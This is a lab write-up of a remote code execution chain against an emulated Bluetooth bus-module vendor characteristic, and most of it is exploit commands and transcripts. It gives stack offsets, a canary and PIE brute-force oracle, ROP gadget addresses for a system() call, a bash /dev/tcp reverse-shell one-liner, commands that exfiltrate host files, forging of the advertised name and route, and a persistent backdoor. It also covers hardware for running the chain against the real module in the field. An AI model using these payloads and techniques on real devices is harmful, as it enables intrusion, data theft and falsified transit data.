# RCE against the emulated bus module

Date: 2026-11-11
Target: Brunel/BusAccess vendor action characteristic `0x1f20`
Transport: `lab/emulator` (self-written ARMv7 target + supervisor)

This is the emulator counterpart of the field run. The client code, gate order
and failure semantics are the same as on the real module; only the radio and
the vendor daemon are replaced.

## What the emulator is

`lab/emulator/bus_module.c` is a small ARMv7 musl-static peripheral:

* a 15-handle GATT database: vendor service `0x1f1f` (write-only action
  `0x1f20`), route service `0x201f` (read `0x2020`), device name `0x2a00`,
  PnP `0x2a50` and GATT service `0x1801`;
* ATT operations `0x02`, `0x04`, `0x08`, `0x0a`, `0x10`, `0x12`, `0x16`,
  `0x18`, `0x52`, MTU capped at 517, prepare/execute queue;
* the vulnerable handler: `memcpy(buf[256], value, len)` with `len` up to 512,
  plus a second copy into `action_shadow` that the chain's command pointer
  targets;
* `system()` from libc, a `pop {r0, r4, pc}` gadget, a
  `pop {r0, r4, lr}; bx r4` gadget and `emu_continue()`, which `siglongjmp`s
  back to the serve loop so one process can be exploited repeatedly;
* a `0x42` + command backdoor that survives reboots (`state/persist`).

`lab/emulator/supervisor.py` owns advertisements, power state and restart
policy: a crashing app is brought back after `--recovery-delay`, and
`SHUTDOWN`/`BOOT` really stop and start the process. `state/` outlives a
restart, so forged name/route data can be shown to persist.

`research/brunel/emulator.py` is the transport. ATT rides one loopback
channel; scanning and supervisor control use separate ones, so a client
disconnect never stops advertisements.

## Profiles

| profile | canary | PIE | saved LR from `buf` |
| --- | --- | --- | --- |
| `plain` | no | no | 260 |
| `canary` | yes (`buf[256]`, LR 264) | no | 264 |
| `pie` | yes | 64 fixed relocated bases | 264 |

Offsets are read from the disassembly of `handle_action` (`sp+8` buffer,
`sp+268` saved LR), not guessed from a crash ladder, and every address comes
from `lab/build/emulator/symbols.jsonl`.

Thumb/ARM matters: the binary is Thumb, so the gadget and the
`emu_continue` return take the Thumb bit, while libc `system` is ARM and must
not.

## Gate order

The run keeps the field order: fingerprint → `0x01` stop hello → action
payload. A 512-byte payload against a non-canary frame kills Bluetooth until
the app restarts; that is unchanged and shows up as an outage.

## Stages

1. Recover the canary (canary/PIE profile only). A value of
   `256 + n` bytes overwrites `n` canary bytes and leaves the saved LR
   intact, so the handler returns only when every guessed byte matches. A
   wrong byte aborts, the supervisor restarts, and the `runs` counter from
   `STATUS` is the oracle. Byte 0 is musl's `0x00` terminator.
2. Recover the PIE base (PIE profile only). 64 candidate layouts, one write
   each, each with a unique marker command; the winning base leaves that
   marker in the state directory.
3. Deliver the chain: canary, then `pop {r0, r4, lr}; bx r4`, the command
   pointer into `action_shadow`, `system`, and `emu_continue` as the return.
4. Post-exploitation over the same primitive: commands, file exfiltration,
   forged advertisement name, and power control.

The chain is 16 bytes and the command is placed immediately behind it in the
mirror buffer, so the command pointer is derived, not hardcoded.

## Commands

```sh
lab/emulator/build.sh
python3 lab/emulator/supervisor.py --port 9200 --state /tmp/brunel-test --profile plain
python3 lab/emulator/exploit.py --port 9200 --cmd "id"
python3 lab/emulator/brute.py --port 9201                 # canary oracle
python3 lab/emulator/pie.py --port 9202                   # canary + base
python3 lab/emulator/exploit.py --port 9200 --persist     # 0x42 backdoor
python3 lab/emulator/exploit.py --port 9200 --shell
# same chain through the product CLI (addresses from symbols.jsonl)
.venv/bin/brunel rce --transport emu:9200 --offset 260 --no-leak \
  --gadget 0x102c4 --gadget-lr 0x102c8 --system 0x14320 \
  --shadow 0x2c120 --return-addr 0x10254 --command-addr 0x2c234 --cmd id
```

## Hardware

A phone alone is the field oracle: it can fingerprint, send `0x01`, run the
ladder and the canary oracle.

A Raspberry Pi with a BT500 (or any HCI adapter that does raw ATT with MTU
517) is the chain host: the ROP payload is 512 bytes and needs a controller
that carries it in one write.

An ESP32 WROOM is not enough on its own: its BLE stack caps the usable
attribute value well below 512 bytes unless the payload is split through
prepare/execute, and it still needs a host for the shell.

## Demonstrated

Each block is an actual transcript against a live supervisor, trimmed of the
ATT chatter.

Baseline, before any chain, to show the gate and the crash semantics are the
field ones:

```text
$ .venv/bin/brunel rce --transport emu:9200 --profile armv7 --offset 260 --no-leak
fingerprint  finding  78:C4:0E:00:00:00 ... name='ivi'
action       crash    offset 260: target silent for 302 ms
```

Plain profile, one chain, command runs and the target stays up:

```text
$ python3 lab/emulator/exploit.py --port 9200 --cmd "id"
ok  id
$ python3 lab/emulator/exploit.py --port 9200 --cmd "id"
ok  id
```

Same run counter and same process ID before and after both writes, so the
`siglongjmp` resume works and the module is not merely restarted.

Canary profile, oracle recovers the value and the chain then succeeds 3/3
with zero crashes (the canary itself is a supervisor secret `85892900`,
returned little-endian as `00298985`):

```text
$ python3 lab/emulator/brute.py --port 9201
byte 256 = 0x00  (00)
byte 257 = 0x29  (0029)
byte 258 = 0x89  (002989)
byte 259 = 0x85  (00298985)
canary 00298985
$ python3 lab/emulator/exploit.py --port 9201 --profile canary --canary 00298985 --shell
ok  id
ok  id
ok  id
```

PIE profile, full brute force from scratch: canary at `00533485`, then base
`pie_47` at `0x420000`, then the proof command:

```text
$ python3 lab/emulator/pie.py --port 9203
recovering canary
byte 256 = 0x00  (00)
...
canary 00533485
...
  pie_46 no
base pie_47 at 0x420000
proof: pie-rce
```

Remote data access: a host file is written through the chain and fetched back
over `GET` from the supervisor (the GATT-equivalent read path), with newlines
collapsed so one read returns the whole file:

```text
$ python3 lab/emulator/exploit.py --port 9200 \
    --cmd "/tmp/brunel-emu/sh -c '{ uname -a; id; cat /etc/hostname; } | tr \"\\n\" \"|\" > \$EMU_STATE/leak1'" \
    --exfil leak1
ok  ...
  exfil leak1: 'Linux omarchy ... x86_64 GNU/Linux|uid=1000(janosch) ...|omarchy|'
```

Fraudulent bus data. The chain overwrites the advertised name and the route
value, the advertisement changes live, and both survive a power cycle because
they are read back from `state/` on boot:

```text
$ python3 lab/emulator/exploit.py --port 9200 \
    --cmd "/tmp/brunel-emu/sh -c 'echo EVILBUS > \$EMU_STATE/name; echo 9a:aa:00:00:00:00 > \$EMU_STATE/route'"
ok  ...
advert: ('78:C4:0E:00:00:00', '...08094556494c425553...')   # AD type 0x09, "EVILBUS"
$ ... shutdown, boot, reconnect
0x2a00: EVILBUS
route 0x2020: b'9a:aa:00:00:00:00\n'
```

Persistence. The chain drops `state/persist`, the supervisor reboots the app,
and afterwards a plain `0x42<cmd>` write executes with no overflow at all:

```text
$ python3 lab/emulator/exploit.py --port 9200 --persist
ok  /tmp/brunel-emu/sh -c 'echo 1 > $EMU_STATE/persist'
backdoor: backdoor
```

Reverse shell. One chain starts a detached interactive shell and the GATT
daemon keeps serving (`crashes` 0, `runs` 1 afterwards):

```text
$ python3 lab/emulator/exploit.py --port 9200 \
    --cmd "setsid /bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' >/dev/null 2>&1 &"
ok  ...
# on the listener
connect from ('127.0.0.1', 38398)
id; hostname; uname -m; echo MARK-$((6*7))
uid=1000(janosch) ...
omarchy
x86_64
MARK-42
```

This only proves the shell mechanics. On the module the shell runs as the
vendor app's user, needs an IP route back to the host, and needs a shell that
can do `/dev/tcp` or a `nc -e`; see the limits below.


## Limits

Crash detection compares the supervisor's run counter before and after a
write; advertisement silence alone would miss a fast restart, so the client
prefers the counter and only falls back to silence on a radio.

qemu-user runs the guest `system()` through the host `/bin/sh`, so command
output is the host's, not the module's. Address space is the emulator's, not
the real binary's; the real offsets still need a target-side dump.

Exfiltration uses the supervisor's line protocol, so a file with newlines is
only returned up to the first one; commands either collapse newlines first or
split the read. On real hardware this is a plain GATT read and has no such
limit.

The reverse shell above is a host shell in qemu-user. On the module three
things are unproven: the user (likely not root), an IP route from the module
back to the host, and the available tooling (`/dev/tcp` needs bash, `nc -e`
needs a busybox build with it). Without an IP path the fallback is a BLE-only
poller: the shell loop reads its command from a file the primitive writes.
